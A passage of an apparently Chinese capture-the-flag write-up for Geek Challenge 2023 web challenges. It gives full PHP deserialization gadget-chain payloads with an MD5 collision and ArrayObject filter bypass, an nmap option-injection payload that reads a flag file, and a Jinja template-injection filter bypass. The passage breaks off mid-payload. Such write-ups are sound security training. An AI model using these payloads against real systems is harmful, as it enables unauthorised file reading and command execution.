class="headerlink" title="ez_php"></a>ez_php</h3><blockquote><p>我的女神呢？快帮我找找</p></blockquote><p>源码在 <code>havefun.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;key.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;进来啦&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;bro===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;错了哥们,再试试吧&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;好累，好想睡一觉啊&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;解密成功！&lt;br&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;快点的，急急急！！！&lt;br&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;真的只差一步了！&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;兄弟怎么搞的？&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;睡饱了，接着找！&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;快拿到我的小秘密了&lt;br&gt;&quot;</span>);</span><br><span class="line">                    <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span>(<span class="string">&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;</span>);</span><br><span class="line">                            <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span>(<span class="string">&quot;你别这样，她会生气的┭┮﹏┭┮&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;快帮我找找她！&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先反序列化 <code>useless</code> 类的 <code>__destruct()</code> 拿到 <code>key.php</code>：</p><p>用 <code>ArrayObject</code> 绕过 <code>/^[Oa]:[\d]+/i</code>，md5碰撞，再根据 <code>and</code> 的优先级无视 <code>$random</code>：</p><p><code>C:11:&quot;ArrayObject&quot;:196:&#123;x:i:0;O:7:&quot;useless&quot;:2:&#123;s:2:&quot;QW&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&quot;;s:3:&quot;YXX&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><code>basename()</code> 绕过 <code>$_SERVER[&#39;PHP_SELF&#39;]</code>：</p><p><code>/havefun.php/key.php?user=C:11:%22ArrayObject%22:196:&#123;x:i:0;O:7:%22useless%22:2:&#123;s:2:%22QW%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2%22;s:3:%22YXX%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2%22;&#125;;m:a:0:&#123;&#125;&#125;&amp;a=PHP_SELF</code></p><p>得到图片，信息是 <code>key=9</code>：</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/download.jpg" alt="download" style="zoom: 50%;"></p><p>最后再来一次反序列化链调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Me:__wakeup() （引用）</span><br><span class="line">her:__invoke()</span><br><span class="line">important:__sleep()</span><br><span class="line">useless:__get()</span><br><span class="line">her:find()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;qwe = <span class="keyword">new</span> her;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = &amp;<span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;asd = <span class="keyword">new</span> important;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="keyword">new</span> useless;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="keyword">array</span>(<span class="string">&#x27;seeyou&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> hez,<span class="string">&#x27;find&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hez</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hername = <span class="string">&#x27;momo&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Me</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>，修改引用11为13：</p><p><code>C:11:%22ArrayObject%22:260:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A13%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>修改引用16为18，改hez为her：</p><p><code>C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>最终payload，列目录：</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=glob://f*</code></p><p>POST: <code>ctf=DirectoryIterator</code></p><p>得到flag文件名为 <code>flag_my_baby.php</code>。</p><p>再读flag文件：</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=php://filter/convert.base64-encode/resource=flag_my_baby.php</code></p><p>POST: <code>ctf=SplFileObject</code></p><p>结果base64解码即得flag。</p><p>​    </p><h3 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h3><blockquote><p>nmap也太好用了！不是吧，你还不会用吗？</p></blockquote><p>过滤了 <code>?  php flag iL oN</code></p><p>参考：<a href="https://blog.csdn.net/qq_43801002/article/details/107746582">[网鼎杯 2020 朱雀组]Nmap</a></p><p>使用nmap读文件，选项 <code>-oA</code>，该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</p><p>使用 <code>?ip=127.0.0.1&#39; -i /fl&quot;&quot;ag -oA 1 &#39;</code>，再访问 <code>1.nmap</code> 得到flag。</p><p>​    </p><h3 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h3><blockquote><p>”可恶，我不信，我绝对不是klf，你们才是，哈哈这次我卷土重来了，你们肯定是klf，我要向女神证明自己…“</p></blockquote><p><code>robots.txt</code> 得路由 <code>/secr3ttt</code>，测试过滤关键字有：</p><p><code>[ ] _  &#39; &quot; \ config init globals os import request open read 0 137 pop</code></p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set 